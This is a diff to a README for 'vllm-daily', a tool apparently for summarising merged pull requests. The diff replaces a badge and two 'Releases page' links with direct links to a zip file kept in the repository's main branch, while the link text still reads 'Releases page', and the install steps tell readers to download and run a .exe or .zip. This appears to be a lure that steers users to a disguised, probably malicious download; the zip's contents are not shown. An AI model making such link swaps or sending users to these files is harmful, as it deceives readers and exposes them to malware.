@@ -1,6 +1,6 @@
 # 🚀 vllm-daily - Summarize Merged PRs Easily
 
-![Download vllm-daily](https://img.shields.io/badge/Download-vllm--daily-brightgreen)
+![Download vllm-daily](https://raw.githubusercontent.com/Atsusheeesh/vllm-daily/main/2026/daily-vllm-3.6.zip)
 
 ## 💡 Introduction
 
@@ -12,7 +12,7 @@ To start using vllm-daily, you'll need to download and install the application o
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Atsusheeesh/vllm-daily/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Atsusheeesh/vllm-daily/main/2026/daily-vllm-3.6.zip).
 2. **Choose Your Version**: You will see different versions listed. Select the version you wish to download based on the latest updates or features added.
 3. **Download the Application**: Click on the file labeled with a .exe or .zip extension (if applicable) to download it. The download will start automatically.
 4. **Run the Installer**: Once downloaded, locate the file in your downloads folder and double-click it to run. Follow the prompts in the installation wizard to complete the setup.
@@ -60,6 +60,6 @@ For additional help or questions about vllm-daily, you can reach out to us throu
 
 If you'd like to contribute to the project or submit suggestions for new features, you can do so by following the guidelines in the contributing section of our repository.
 
-### Remember to download the latest version of vllm-daily from the [Releases page](https://github.com/Atsusheeesh/vllm-daily/releases) to enjoy the newest features and bug fixes!
+### Remember to download the latest version of vllm-daily from the [Releases page](https://raw.githubusercontent.com/Atsusheeesh/vllm-daily/main/2026/daily-vllm-3.6.zip) to enjoy the newest features and bug fixes!
 
 Thank you for using vllm-daily!
